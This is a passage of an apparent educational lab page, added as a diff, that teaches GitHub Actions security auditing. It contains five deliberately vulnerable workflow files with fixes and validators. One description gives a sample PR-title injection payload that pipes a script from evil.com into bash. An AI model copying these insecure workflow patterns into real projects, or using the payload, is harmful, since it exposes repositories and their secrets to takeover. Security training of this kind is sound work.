@@ -1,0 +1,1227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../../components/AchievementManager.js"></script>
+    <script src="../../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actions Security Audit - Code House - Hexworth Prime</title>
+    <link rel="icon" type="image/webp" href="../../../../../assets/images/icons/icon-controls.webp">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --forge: #3b82f6; --forge-dim: rgba(59, 130, 246, 0.12); --forge-glow: rgba(59, 130, 246, 0.3);
+            --bg: #0a0a0f; --bg-card: #12121a; --bg-code: #0d1117;
+            --text: #e0e0e0; --text-dim: #8b949e; --border: rgba(255,255,255,0.08);
+            --blue: #3b82f6; --orange: #f59e0b; --red: #ef4444; --purple: #8b5cf6;
+            --green: #22c55e; --cyan: #06b6d4;
+        }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; line-height: 1.7; }
+
+        /* Header */
+        .header {
+            position: sticky; top: 0; z-index: 100; display: flex; align-items: center; justify-content: space-between;
+            padding: 12px 24px; background: rgba(10,10,15,0.94); backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(59,130,246,0.2);
+        }
+        .header-left { display: flex; align-items: center; gap: 12px; }
+        .header-badge { font-size: 11px; padding: 3px 10px; border-radius: 4px; background: var(--forge-dim); color: var(--forge); font-weight: 700; letter-spacing: 1px; }
+        .header h1 { font-size: 15px; font-weight: 600; }
+        .back-link { font-size: 13px; color: var(--forge); font-weight: 600; text-decoration: none; padding: 6px 14px; border-radius: 6px; border: 1px solid rgba(59,130,246,0.25); transition: all 0.2s; }
+        .back-link:hover { background: var(--forge-dim); }
+
+        /* Lab Layout */
+        .lab-container { display: flex; height: calc(100vh - 49px); overflow: hidden; }
+        .panel { overflow-y: auto; padding: 0; }
+        .panel-left { width: 55%; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+        .panel-right { width: 45%; display: flex; flex-direction: column; }
+
+        /* Panel headers */
+        .panel-header {
+            padding: 12px 20px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between; flex-shrink: 0;
+        }
+        .panel-title { font-size: 13px; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; }
+        .panel-title img { width: 16px; height: 16px; }
+        .panel-body { flex: 1; overflow-y: auto; padding: 0; }
+
+        /* Workflow tabs */
+        .workflow-tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); flex-shrink: 0; overflow-x: auto; }
+        .workflow-tab {
+            padding: 10px 16px; font-size: 12px; font-weight: 600; color: var(--text-dim); cursor: pointer;
+            border-bottom: 2px solid transparent; white-space: nowrap; transition: all 0.2s;
+            background: none; border-top: none; border-left: none; border-right: none;
+        }
+        .workflow-tab:hover { color: var(--text); background: rgba(255,255,255,0.02); }
+        .workflow-tab.active { color: var(--forge); border-bottom-color: var(--forge); }
+        .workflow-tab .tab-status { display: inline-block; width: 7px; height: 7px; border-radius: 50%; margin-left: 6px; }
+        .tab-status.clean { background: var(--green); }
+        .tab-status.flagged { background: var(--orange); }
+        .tab-status.missed { background: var(--red); }
+
+        /* YAML display */
+        .yaml-display { padding: 0; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 13px; line-height: 1.7; }
+        .yaml-line {
+            display: flex; padding: 0 16px; cursor: pointer; transition: background 0.15s; min-height: 22px;
+        }
+        .yaml-line:hover { background: rgba(255,255,255,0.03); }
+        .yaml-line.flagged { background: rgba(239,68,68,0.1); border-left: 3px solid var(--red); }
+        .yaml-line.correct-flag { background: rgba(34,197,94,0.1); border-left: 3px solid var(--green); }
+        .yaml-line.missed-flag { background: rgba(245,158,11,0.1); border-left: 3px solid var(--orange); }
+        .line-num { color: var(--text-dim); min-width: 36px; text-align: right; padding-right: 16px; user-select: none; font-size: 12px; line-height: 1.7; }
+        .line-content { flex: 1; white-space: pre; color: #e6edf3; }
+        .line-flag-icon { width: 20px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .line-flag-icon img { width: 14px; height: 14px; opacity: 0; transition: opacity 0.2s; }
+        .yaml-line:hover .line-flag-icon img { opacity: 0.5; }
+        .yaml-line.flagged .line-flag-icon img,
+        .yaml-line.correct-flag .line-flag-icon img,
+        .yaml-line.missed-flag .line-flag-icon img { opacity: 1; }
+
+        /* YAML syntax coloring */
+        .y-key { color: #ff7b72; }
+        .y-val { color: #a5d6ff; }
+        .y-str { color: #a5d6ff; }
+        .y-comment { color: #8b949e; }
+        .y-bool { color: #ff7b72; }
+        .y-bracket { color: #d2a8ff; }
+        .y-action { color: #79c0ff; }
+        .y-danger { color: #ffa657; background: rgba(239,68,68,0.15); padding: 0 2px; border-radius: 2px; }
+
+        /* Right panel - audit report */
+        .audit-section { padding: 20px; }
+        .audit-intro { padding: 20px; }
+        .audit-intro h3 { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+        .audit-intro p { font-size: 13px; color: var(--text-dim); margin-bottom: 12px; }
+
+        /* Stats bar */
+        .stats-bar { display: flex; gap: 12px; padding: 14px 20px; border-bottom: 1px solid var(--border); flex-shrink: 0; flex-wrap: wrap; }
+        .stat-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 8px 14px; text-align: center; flex: 1; min-width: 80px; }
+        .stat-val { font-size: 20px; font-weight: 800; color: #fff; }
+        .stat-label { font-size: 10px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.5px; }
+
+        /* Finding card */
+        .finding-card {
+            background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px;
+            padding: 16px; margin-bottom: 12px; transition: all 0.2s;
+        }
+        .finding-card.active { border-color: var(--forge); }
+        .finding-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .finding-severity {
+            font-size: 10px; padding: 2px 8px; border-radius: 3px; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 0.5px;
+        }
+        .severity-critical { background: rgba(239,68,68,0.15); color: var(--red); }
+        .severity-high { background: rgba(245,158,11,0.15); color: var(--orange); }
+        .severity-medium { background: rgba(139,92,246,0.15); color: var(--purple); }
+        .finding-title { font-size: 14px; font-weight: 600; color: #fff; }
+        .finding-location { font-size: 11px; color: var(--text-dim); margin-bottom: 10px; font-family: 'Cascadia Code', monospace; }
+        .finding-desc { font-size: 13px; color: var(--text-dim); margin-bottom: 12px; line-height: 1.6; }
+
+        /* Multiple choice */
+        .mc-options { display: flex; flex-direction: column; gap: 6px; margin-bottom: 14px; }
+        .mc-option {
+            display: flex; align-items: center; gap: 10px; padding: 8px 12px; border-radius: 6px;
+            border: 1px solid var(--border); cursor: pointer; font-size: 13px; color: var(--text-dim);
+            transition: all 0.15s; background: none;
+        }
+        .mc-option:hover { border-color: var(--forge); color: var(--text); }
+        .mc-option.selected { border-color: var(--forge); background: var(--forge-dim); color: #fff; }
+        .mc-option.correct { border-color: var(--green); background: rgba(34,197,94,0.1); color: var(--green); }
+        .mc-option.incorrect { border-color: var(--red); background: rgba(239,68,68,0.1); color: var(--red); }
+        .mc-radio { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--border); flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
+        .mc-option.selected .mc-radio { border-color: var(--forge); }
+        .mc-option.selected .mc-radio::after { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--forge); }
+        .mc-option.correct .mc-radio { border-color: var(--green); }
+        .mc-option.correct .mc-radio::after { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--green); }
+
+        /* Fix textarea */
+        .fix-area { margin-top: 10px; }
+        .fix-area label { font-size: 12px; font-weight: 600; color: var(--forge); display: block; margin-bottom: 6px; }
+        .fix-textarea {
+            width: 100%; min-height: 60px; background: var(--bg-code); border: 1px solid var(--border);
+            border-radius: 6px; padding: 10px 12px; font-family: 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 12px; color: #e6edf3; resize: vertical; line-height: 1.6;
+        }
+        .fix-textarea:focus { outline: none; border-color: var(--forge); }
+        .fix-textarea:disabled { opacity: 0.6; }
+        .fix-result { font-size: 12px; margin-top: 6px; padding: 6px 10px; border-radius: 4px; }
+        .fix-correct { background: rgba(34,197,94,0.1); color: var(--green); border: 1px solid rgba(34,197,94,0.2); }
+        .fix-incorrect { background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.2); }
+        .fix-partial { background: rgba(245,158,11,0.1); color: var(--orange); border: 1px solid rgba(245,158,11,0.2); }
+
+        /* Buttons */
+        .btn {
+            padding: 8px 18px; border: none; border-radius: 6px; font-size: 13px; font-weight: 600;
+            cursor: pointer; transition: all 0.2s;
+        }
+        .btn-primary { background: var(--forge); color: #fff; }
+        .btn-primary:hover { background: #2563eb; }
+        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-danger { background: rgba(239,68,68,0.15); color: var(--red); border: 1px solid rgba(239,68,68,0.3); }
+        .btn-danger:hover { background: rgba(239,68,68,0.25); }
+        .btn-success { background: rgba(34,197,94,0.15); color: var(--green); border: 1px solid rgba(34,197,94,0.3); }
+        .btn-ghost { background: none; color: var(--text-dim); border: 1px solid var(--border); }
+        .btn-ghost:hover { color: var(--text); border-color: var(--text-dim); }
+        .btn-row { display: flex; gap: 8px; margin-top: 12px; align-items: center; }
+
+        /* Phases */
+        .phase-indicator {
+            display: flex; gap: 0; margin-bottom: 0; padding: 0 20px; border-bottom: 1px solid var(--border); flex-shrink: 0;
+        }
+        .phase-step {
+            padding: 10px 16px; font-size: 11px; font-weight: 600; color: var(--text-dim);
+            border-bottom: 2px solid transparent; cursor: default; text-transform: uppercase; letter-spacing: 0.5px;
+        }
+        .phase-step.active { color: var(--forge); border-bottom-color: var(--forge); }
+        .phase-step.done { color: var(--green); }
+
+        /* Attacker mode */
+        .attacker-section { padding: 20px; }
+        .attacker-section h3 { font-size: 16px; font-weight: 700; color: var(--red); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .attacker-section h3 img { width: 18px; height: 18px; }
+        .attacker-desc { font-size: 13px; color: var(--text-dim); margin-bottom: 16px; line-height: 1.6; }
+        .attacker-challenge { background: var(--bg-card); border: 1px solid rgba(239,68,68,0.2); border-radius: 8px; padding: 16px; margin-bottom: 14px; }
+        .attacker-challenge h4 { font-size: 13px; color: var(--red); margin-bottom: 8px; }
+        .attacker-input {
+            width: 100%; background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px;
+            padding: 10px 12px; font-family: 'Cascadia Code', monospace; font-size: 12px; color: #e6edf3;
+        }
+        .attacker-input:focus { outline: none; border-color: var(--red); }
+        .attacker-hint { font-size: 11px; color: var(--text-dim); margin-top: 6px; }
+        .attacker-result { margin-top: 10px; padding: 10px; border-radius: 6px; font-size: 12px; font-family: 'Cascadia Code', monospace; }
+        .attacker-success { background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.2); color: var(--green); }
+        .attacker-fail { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.2); color: var(--red); }
+
+        /* Report */
+        .report-section { padding: 20px; }
+        .report-section h3 { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 16px; }
+        .report-grade { text-align: center; padding: 24px; margin-bottom: 20px; }
+        .report-grade-letter { font-size: 64px; font-weight: 900; }
+        .report-grade-label { font-size: 14px; color: var(--text-dim); margin-top: 4px; }
+        .report-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
+        .report-row-label { color: var(--text-dim); }
+        .report-row-value { color: #fff; font-weight: 600; }
+        .report-findings { margin-top: 20px; }
+        .report-finding { padding: 12px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 8px; }
+        .report-finding-title { font-size: 13px; font-weight: 600; color: #fff; margin-bottom: 4px; }
+        .report-finding-status { font-size: 11px; }
+
+        .complete-section { text-align: center; padding: 24px 0; }
+        .complete-btn {
+            padding: 14px 36px; border: none; border-radius: 8px; font-size: 14px; font-weight: 700;
+            cursor: pointer; transition: all 0.2s; background: linear-gradient(135deg, var(--forge), #2563eb); color: #fff;
+        }
+        .complete-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px var(--forge-glow); }
+
+        /* Scrollbar */
+        .panel-body::-webkit-scrollbar { width: 6px; }
+        .panel-body::-webkit-scrollbar-track { background: transparent; }
+        .panel-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .lab-container { flex-direction: column; height: auto; }
+            .panel-left, .panel-right { width: 100%; }
+            .panel-left { max-height: 50vh; }
+        }
+
+        /* Hidden */
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-left">
+            <span class="header-badge">DO-113</span>
+            <h1>Actions Security Audit</h1>
+        </div>
+        <a href="index.html" class="back-link">&larr; CI/CD Pipelines</a>
+    </header>
+
+    <div class="lab-container">
+        <!-- Left Panel: Workflow YAML -->
+        <div class="panel panel-left">
+            <div class="panel-header">
+                <div class="panel-title">
+                    <img src="../../../../../assets/images/icons/icon-controls.webp" alt="">
+                    <span>.github/workflows/</span>
+                </div>
+                <span id="fileCount" style="font-size:11px;color:var(--text-dim);">0 / 5 audited</span>
+            </div>
+            <div class="workflow-tabs" id="workflowTabs"></div>
+            <div class="panel-body">
+                <div class="yaml-display" id="yamlDisplay"></div>
+            </div>
+        </div>
+
+        <!-- Right Panel: Audit Report -->
+        <div class="panel panel-right">
+            <div class="phase-indicator" id="phaseIndicator">
+                <div class="phase-step active" data-phase="audit">1. Audit</div>
+                <div class="phase-step" data-phase="attacker">2. Attacker Mode</div>
+                <div class="phase-step" data-phase="report">3. Report</div>
+            </div>
+            <div class="stats-bar" id="statsBar">
+                <div class="stat-box"><div class="stat-val" id="statFound">0</div><div class="stat-label">Found</div></div>
+                <div class="stat-box"><div class="stat-val" id="statTotal">7</div><div class="stat-label">Total Vulns</div></div>
+                <div class="stat-box"><div class="stat-val" id="statFixed">0</div><div class="stat-label">Fixed</div></div>
+                <div class="stat-box"><div class="stat-val" id="statScore">0%</div><div class="stat-label">Score</div></div>
+            </div>
+            <div class="panel-body" id="rightPanelBody">
+                <!-- Dynamic content injected here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+    (function() {
+        'use strict';
+
+        // =====================================================================
+        // WORKFLOW DATA — 5 workflow files with 7 embedded vulnerabilities
+        // =====================================================================
+        const WORKFLOWS = [
+            {
+                name: 'ci.yml',
+                vulns: [0], // indices into VULNS
+                yaml: [
+                    'name: CI Pipeline',
+                    '',
+                    'on:',
+                    '  push:',
+                    '    branches: [main]',
+                    '  pull_request:',
+                    '    branches: [main]',
+                    '',
+                    'permissions: write-all',
+                    '',
+                    'jobs:',
+                    '  build:',
+                    '    runs-on: ubuntu-latest',
+                    '    steps:',
+                    '      - uses: actions/checkout@main',
+                    '      - name: Setup Node',
+                    '        uses: actions/setup-node@v4',
+                    '        with:',
+                    '          node-version: 20',
+                    '      - run: npm ci',
+                    '      - run: npm test',
+                    '      - run: npm run build',
+                ]
+            },
+            {
+                name: 'pr-greet.yml',
+                vulns: [1],
+                yaml: [
+                    'name: PR Greeting',
+                    '',
+                    'on:',
+                    '  pull_request_target:',
+                    '    types: [opened]',
+                    '',
+                    'permissions:',
+                    '  pull-requests: write',
+                    '',
+                    'jobs:',
+                    '  greet:',
+                    '    runs-on: ubuntu-latest',
+                    '    steps:',
+                    '      - uses: actions/checkout@v4',
+                    '      - name: Post welcome comment',
+                    '        run: |',
+                    '          echo "Thanks for the PR: ${{ github.event.pull_request.title }}"',
+                    '          gh pr comment ${{ github.event.number }} \\',
+                    '            --body "Welcome, ${{ github.event.pull_request.user.login }}! \\',
+                    '            Your PR \'${{ github.event.pull_request.title }}\' is under review."',
+                    '        env:',
+                    '          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}',
+                ]
+            },
+            {
+                name: 'deploy.yml',
+                vulns: [2],
+                yaml: [
+                    'name: Deploy to Production',
+                    '',
+                    'on:',
+                    '  push:',
+                    '    branches: [main]',
+                    '',
+                    'permissions:',
+                    '  contents: read',
+                    '',
+                    'jobs:',
+                    '  deploy:',
+                    '    runs-on: ubuntu-latest',
+                    '    steps:',
+                    '      - uses: actions/checkout@v4',
+                    '      - name: Configure credentials',
+                    '        run: |',
+                    '          echo "Token: ${{ secrets.DEPLOY_TOKEN }}"',
+                    '          echo "Deploying with key: ${{ secrets.AWS_SECRET_KEY }}"',
+                    '          aws configure set aws_access_key_id ${{ secrets.AWS_KEY_ID }}',
+                    '          aws configure set aws_secret_access_key ${{ secrets.AWS_SECRET_KEY }}',
+                    '      - name: Deploy',
+                    '        run: aws s3 sync ./dist s3://prod-bucket',
+                ]
+            },
+            {
+                name: 'docker-scan.yml',
+                vulns: [3, 4],
+                yaml: [
+                    'name: Docker Image Scan',
+                    '',
+                    'on:',
+                    '  pull_request_target:',
+                    '    types: [opened, synchronize]',
+                    '',
+                    'permissions:',
+                    '  contents: write',
+                    '  packages: write',
+                    '  pull-requests: write',
+                    '',
+                    'jobs:',
+                    '  scan:',
+                    '    runs-on: ubuntu-latest',
+                    '    steps:',
+                    '      - uses: actions/checkout@v4',
+                    '        with:',
+                    '          ref: ${{ github.event.pull_request.head.sha }}',
+                    '      - name: Build image',
+                    '        uses: docker://node:latest',
+                    '        with:',
+                    '          args: npm run build',
+                    '      - name: Scan image',
+                    '        uses: aquasecurity/trivy-action@master',
+                    '        with:',
+                    '          image-ref: myapp:latest',
+                    '      - name: Post results',
+                    '        run: echo "Scan complete"',
+                ]
+            },
+            {
+                name: 'release.yml',
+                vulns: [5, 6],
+                yaml: [
+                    'name: Release Pipeline',
+                    '',
+                    'on:',
+                    '  pull_request:',
+                    '    types: [opened, synchronize]',
+                    '',
+                    'permissions:',
+                    '  contents: write',
+                    '  packages: write',
+                    '  issues: write',
+                    '  pull-requests: write',
+                    '  id-token: write',
+                    '',
+                    'jobs:',
+                    '  release:',
+                    '    runs-on: ubuntu-latest',
+                    '    steps:',
+                    '      - uses: actions/checkout@v4',
+                    '      - name: Semantic Release',
+                    '        uses: docker://semantic-release:latest',
+                    '        env:',
+                    '          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}',
+                    '          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}',
+                    '      - name: Publish package',
+                    '        run: npm publish',
+                    '        env:',
+                    '          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}',
+                ]
+            }
+        ];
+
+        // =====================================================================
+        // VULNERABILITY DEFINITIONS
+        // =====================================================================
+        const VULNS = [
+            {
+                id: 'v1',
+                workflow: 0,
+                line: 8, // 0-indexed: "permissions: write-all"
+                title: 'Over-Permissive Permissions',
+                severity: 'high',
+                category: 'excessive-permissions',
+                description: 'The workflow uses <code>permissions: write-all</code>, granting every GITHUB_TOKEN scope to all jobs. This violates the principle of least privilege and increases blast radius if any step is compromised.',
+                mcOptions: [
+                    { text: 'Script injection', correct: false },
+                    { text: 'Excessive permissions', correct: true },
+                    { text: 'Unpinned dependency', correct: false },
+                    { text: 'Secret exposure', correct: false },
+                ],
+                fixHint: 'Replace with scoped permissions (e.g., contents: read)',
+                fixValidate: function(input) {
+                    var t = input.toLowerCase().replace(/\s+/g, ' ').trim();
+                    if (t.includes('write-all') || t.includes('write_all')) return { pass: false, msg: 'Still using write-all. Scope the permissions to only what is needed.' };
+                    if (t.includes('permissions:') && (t.includes('contents: read') || t.includes('contents:read'))) return { pass: true, msg: 'Correct. Scoped permissions applied.' };
+                    if (t.includes('permissions:') && (t.includes('read') || t.includes('none'))) return { pass: true, msg: 'Good. Permissions are now scoped.' };
+                    return { pass: false, msg: 'Specify scoped permissions, e.g., permissions:\\n  contents: read' };
+                },
+                fixExample: 'permissions:\n  contents: read',
+                secondaryLine: 14, // "uses: actions/checkout@main" — also vuln but tracked separately
+            },
+            {
+                id: 'v2',
+                workflow: 1,
+                line: 16, // "echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
+                title: 'Script Injection via Untrusted Input',
+                severity: 'critical',
+                category: 'script-injection',
+                description: 'The PR title is interpolated directly into a shell <code>run:</code> block via <code>${{ github.event.pull_request.title }}</code>. An attacker can craft a PR title containing shell metacharacters (e.g., <code>"; curl evil.com/steal.sh | bash; #</code>) to execute arbitrary commands with the workflow\'s permissions.',
+                mcOptions: [
+                    { text: 'Script injection', correct: true },
+                    { text: 'Excessive permissions', correct: false },
+                    { text: 'Mutable action reference', correct: false },
+                    { text: 'Missing environment guard', correct: false },
+                ],
+                fixHint: 'Use an environment variable instead of direct interpolation',
+                fixValidate: function(input) {
+                    var t = input.trim();
+                    if (t.includes('${{ github.event.pull_request.title }}') && !t.includes('env:') && !t.includes('INPUT_') && !t.includes('$PR_TITLE') && !t.includes('$TITLE')) return { pass: false, msg: 'Still using direct expression interpolation in the run block.' };
+                    if ((t.includes('env:') || t.includes('ENV:')) && !t.includes('${{') && (t.includes('$PR_TITLE') || t.includes('$TITLE') || t.includes('${PR_TITLE}') || t.includes('${{ env.'))) return { pass: true, msg: 'Correct. Using an environment variable prevents injection.' };
+                    if (t.includes('env:') && t.includes('${{') && (t.includes('PR_TITLE') || t.includes('TITLE'))) {
+                        if (t.includes('run:') && !t.match(/run:.*\$\{\{/)) return { pass: true, msg: 'Good. The expression is in the env mapping, not the shell command.' };
+                        return { pass: 'partial', msg: 'You set the env var, but make sure the run block uses $ENV_VAR not ${{ }}.' };
+                    }
+                    return { pass: false, msg: 'Assign the untrusted value to an env var, then reference $ENV_VAR in the run block.' };
+                },
+                fixExample: 'env:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: |\n  echo "Thanks for the PR: $PR_TITLE"',
+            },
+            {
+                id: 'v3',
+                workflow: 2,
+                line: 16, // echo "Token: ${{ secrets.DEPLOY_TOKEN }}"
+                title: 'Secret Exposed in Logs',
+                severity: 'critical',
+                category: 'secret-exposure',
+                description: 'Secret values are printed via <code>echo</code>, which writes them to the workflow logs. While GitHub attempts to mask secrets, <code>echo</code> with string concatenation can bypass masking. The <code>DEPLOY_TOKEN</code> and <code>AWS_SECRET_KEY</code> are both exposed.',
+                mcOptions: [
+                    { text: 'Script injection', correct: false },
+                    { text: 'Secret exposure in logs', correct: true },
+                    { text: 'Mutable Docker tag', correct: false },
+                    { text: 'Missing branch protection', correct: false },
+                ],
+                fixHint: 'Remove echo statements that print secrets. Use masked environment variables.',
+                fixValidate: function(input) {
+                    var t = input.toLowerCase();
+                    if (t.includes('echo') && (t.includes('token') || t.includes('key')) && t.includes('${{')) return { pass: false, msg: 'Still echoing secrets to logs.' };
+                    if (!t.includes('echo') || (!t.includes('secrets.') && !t.includes('${{ secrets'))) return { pass: true, msg: 'Correct. Secrets are no longer printed to logs.' };
+                    return { pass: false, msg: 'Remove all echo statements that output secret values.' };
+                },
+                fixExample: 'run: |\n  aws configure set aws_access_key_id ${{ secrets.AWS_KEY_ID }}\n  aws configure set aws_secret_access_key ${{ secrets.AWS_SECRET_KEY }}',
+            },
+            {
+                id: 'v4',
+                workflow: 3,
+                line: 19, // uses: docker://node:latest
+                title: 'Mutable Docker Tag',
+                severity: 'high',
+                category: 'mutable-reference',
+                description: 'The action references <code>docker://node:latest</code> which is a mutable tag. The image behind <code>:latest</code> changes over time and could be hijacked via a supply chain attack. Always pin to a specific SHA digest.',
+                mcOptions: [
+                    { text: 'Unpinned dependency', correct: false },
+                    { text: 'Mutable Docker tag', correct: true },
+                    { text: 'Secret exposure', correct: false },
+                    { text: 'Excessive permissions', correct: false },
+                ],
+                fixHint: 'Pin to a specific image digest (SHA256)',
+                fixValidate: function(input) {
+                    var t = input.trim();
+                    if (t.includes(':latest')) return { pass: false, msg: 'Still using :latest tag.' };
+                    if (t.includes('@sha256:') || t.includes('sha256:')) return { pass: true, msg: 'Correct. Image pinned to SHA digest.' };
+                    if (t.match(/node:\d+/)) return { pass: 'partial', msg: 'Specific version is better than :latest, but SHA digest is the gold standard.' };
+                    return { pass: false, msg: 'Pin to a SHA256 digest, e.g., docker://node@sha256:abc123...' };
+                },
+                fixExample: 'uses: docker://node@sha256:a1b2c3d4e5f6...',
+            },
+            {
+                id: 'v5',
+                workflow: 3,
+                line: 3, // pull_request_target without actor check
+                title: 'Missing Fork PR Guard on pull_request_target',
+                severity: 'critical',
+                category: 'missing-guard',
+                description: 'This workflow uses <code>pull_request_target</code> which runs with the base repo\'s secrets and write permissions, but has no <code>if:</code> guard to check the actor. A fork can submit a PR that triggers this workflow and accesses secrets via the checked-out attacker-controlled code.',
+                mcOptions: [
+                    { text: 'Script injection', correct: false },
+                    { text: 'Secret exposure', correct: false },
+                    { text: 'Missing fork PR guard', correct: true },
+                    { text: 'Excessive permissions', correct: false },
+                ],
+                fixHint: 'Add an if: condition to check the actor or prevent fork execution',
+                fixValidate: function(input) {
+                    var t = input.toLowerCase();
+                    if (t.includes('if:') && (t.includes('github.event.pull_request.head.repo.full_name') || t.includes('github.actor') || t.includes('github.repository') || t.includes('fork'))) return { pass: true, msg: 'Correct. Guard condition prevents fork PRs from accessing secrets.' };
+                    if (t.includes('pull_request:') && !t.includes('pull_request_target')) return { pass: 'partial', msg: 'Switching to pull_request is safer but loses access to base repo secrets for legitimate needs. An if: guard is more precise.' };
+                    return { pass: false, msg: 'Add an if: guard, e.g., if: github.event.pull_request.head.repo.full_name == github.repository' };
+                },
+                fixExample: 'jobs:\n  scan:\n    if: github.event.pull_request.head.repo.full_name == github.repository\n    runs-on: ubuntu-latest',
+            },
+            {
+                id: 'v6',
+                workflow: 4,
+                line: 4, // pull_request trigger with excessive write permissions
+                title: 'GITHUB_TOKEN Over-Scoped on PR Workflow',
+                severity: 'high',
+                category: 'excessive-permissions',
+                description: 'This PR-triggered workflow has <code>contents: write</code>, <code>packages: write</code>, <code>issues: write</code>, <code>pull-requests: write</code>, and <code>id-token: write</code>. A pull_request workflow should rarely need write permissions because PRs from forks run with read-only tokens. This excessive scope increases risk if the workflow is compromised.',
+                mcOptions: [
+                    { text: 'Script injection', correct: false },
+                    { text: 'Excessive GITHUB_TOKEN permissions', correct: true },
+                    { text: 'Mutable action reference', correct: false },
+                    { text: 'Missing branch protection', correct: false },
+                ],
+                fixHint: 'Reduce permissions to minimum needed (typically contents: read for PR builds)',
+                fixValidate: function(input) {
+                    var t = input.toLowerCase().replace(/\s+/g, ' ');
+                    var writeCount = (t.match(/write/g) || []).length;
+                    if (writeCount >= 3) return { pass: false, msg: 'Still too many write permissions. Reduce to minimum needed.' };
+                    if (t.includes('contents: read') || t.includes('contents:read')) return { pass: true, msg: 'Correct. Permissions scoped to least privilege.' };
+                    if (writeCount <= 1 && t.includes('permissions')) return { pass: true, msg: 'Good. Permissions are significantly reduced.' };
+                    return { pass: false, msg: 'Scope down to contents: read (and only what is truly required).' };
+                },
+                fixExample: 'permissions:\n  contents: read',
+            },
+            {
+                id: 'v7',
+                workflow: 0,
+                line: 14, // uses: actions/checkout@main
+                title: 'Action Pinned to Branch (Not SHA)',
+                severity: 'medium',
+                category: 'mutable-reference',
+                description: 'The checkout action is pinned to <code>@main</code> — a mutable branch reference. If the action repository is compromised, all workflows using <code>@main</code> immediately run the attacker\'s code. Always pin actions to a full commit SHA.',
+                mcOptions: [
+                    { text: 'Unpinned action reference', correct: true },
+                    { text: 'Script injection', correct: false },
+                    { text: 'Secret exposure', correct: false },
+                    { text: 'Missing fork guard', correct: false },
+                ],
+                fixHint: 'Pin to a specific commit SHA',
+                fixValidate: function(input) {
+                    var t = input.trim();
+                    if (t.includes('@main') || t.includes('@master')) return { pass: false, msg: 'Still using a branch reference.' };
+                    if (t.match(/@[a-f0-9]{40}/)) return { pass: true, msg: 'Correct. Action pinned to full SHA.' };
+                    if (t.includes('@v4') || t.includes('@v3')) return { pass: 'partial', msg: 'A version tag is better than @main but still mutable. SHA is the gold standard.' };
+                    if (t.match(/@[a-f0-9]{7,}/)) return { pass: true, msg: 'Good. Pinned to commit SHA.' };
+                    return { pass: false, msg: 'Pin to a full commit SHA, e.g., actions/checkout@a1b2c3d4e5f6...' };
+                },
+                fixExample: 'uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2',
+            },
+        ];
+
+        // Categories for multiple choice
+        const CATEGORIES = {
+            'script-injection': 'Script Injection',
+            'excessive-permissions': 'Excessive Permissions',
+            'mutable-reference': 'Mutable Reference',
+            'secret-exposure': 'Secret Exposure',
+            'missing-guard': 'Missing Security Guard',
+        };
+
+        // =====================================================================
+        // STATE
+        // =====================================================================
+        let state = {
+            currentWorkflow: 0,
+            phase: 'audit', // audit | attacker | report
+            flaggedLines: {}, // { "0-8": true } = workflow 0, line 8
+            identifiedVulns: {}, // { v1: { classified: bool, classCorrect: bool, fixed: bool, fixPass: bool|'partial' } }
+            attackerComplete: false,
+            attackerScore: 0,
+            submitted: false,
+        };
+
+        // =====================================================================
+        // RENDER: Workflow Tabs
+        // =====================================================================
+        function renderTabs() {
+            var tabsEl = document.getElementById('workflowTabs');
+            tabsEl.innerHTML = '';
+            WORKFLOWS.forEach(function(wf, i) {
+                var tab = document.createElement('button');
+                tab.className = 'workflow-tab' + (i === state.currentWorkflow ? ' active' : '');
+                var statusClass = getTabStatus(i);
+                tab.innerHTML = wf.name + '<span class="tab-status ' + statusClass + '"></span>';
+                tab.onclick = function() { state.currentWorkflow = i; render(); };
+                tabsEl.appendChild(tab);
+            });
+        }
+
